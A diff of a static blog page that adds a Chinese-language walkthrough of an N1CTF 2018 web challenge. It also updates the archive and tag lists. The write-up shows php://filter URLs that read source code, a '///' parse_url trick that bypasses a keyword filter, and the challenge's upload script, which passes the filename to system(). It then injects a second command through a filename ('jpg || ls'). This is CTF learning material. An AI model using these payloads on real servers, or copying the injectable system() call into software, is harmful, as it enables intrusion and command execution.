@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">197</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">627</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -404,7 +404,41 @@ height:50vh;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"function.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>] ))&#123;</span><br><span class="line">    Header(<span class="string">"Location: user.php?page=info"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"templates/index.html"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>继续读function文件</p>
 <p><code>http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=function</code></p>
+<p>得到：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">"Location: hacker.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现过滤$keywords = [“flag”,”manage”,”ffffllllaaaaggg”];<br>既然是keyword,那我们尝试一下读ffffllllaaaaggg文件</p>
+<p><code>http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</code></p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/1.jpg" alt="N1CTF2018题目复现"></p>
+<p>果不其然，我们被waf了<br>随即审计一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</span><br><span class="line">    parse_str($uri[&apos;query&apos;], $query);</span><br></pre></td></tr></table></figure>
+<p>这里 parse_url函数在解析url时存在的bug，可以通过///x.php 进行绕过。<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">文章</a></p>
+<p><code>http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</code></p>
+<p>得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you can find sth in m4aaannngggeee"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>继续读</p>
+<p><code>http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=m4aaannngggeee</code></p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"templates/upload2323233333.html"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>去访问</p>
+<p><code>http://47.52.152.93:20000/templates/upload2323233333.html</code></p>
+<p>看到有上传，找到上传的后端：upllloadddd.php </p>
+<p>接着读：</p>
+<p><code>http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=upllloadddd</code></p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以清楚的看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);</span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/png;base64,&quot;.$picdata.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>这里可以命令注入，并且把内容打印出来</p>
+<p>我们先本地测试一下</p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/2.jpg" alt="N1CTF2018题目复现"></p>
+<p>发现可以成功将ls的信息打印出来</p>
+<p>于是构造：</p>
+<p><code>jpg || ls 文件名</code></p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/3.jpg" alt="N1CTF2018题目复现"></p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/4.jpg" alt="N1CTF2018题目复现"></p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/5.jpg" alt="N1CTF2018题目复现"></p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/6.jpg" alt="N1CTF2018题目复现"></p>
+<p><img src="/2018/11/10/N1CTF2018题目复现/7.jpg" alt="N1CTF2018题目复现"></p>
+<p>最后拿到flag: N1CTF{1d0ab6949bed0ecf014b087e7282c0da}</p>
 
     </article>
     <!-- license  -->
@@ -1242,9 +1276,25 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 45
+        Total : 47
         </div>
         <!-- search  -->
         
@@ -1257,6 +1307,16 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/vulhub漏洞复现/" >vulhub漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/MISC总结/" >MISC总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1405,12 +1465,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
         </li>
     
     
@@ -1488,9 +1548,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
@@ -1498,11 +1558,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Record,Problem"><span class="iconfont-archer">&#xe606;</span>Record,Problem</span>
     
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
         <span class="sidebar-tag-name" data-tags="漏洞、CTF"><span class="iconfont-archer">&#xe606;</span>漏洞、CTF</span>
     
         <span class="sidebar-tag-name" data-tags="problem"><span class="iconfont-archer">&#xe606;</span>problem</span>
-    
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
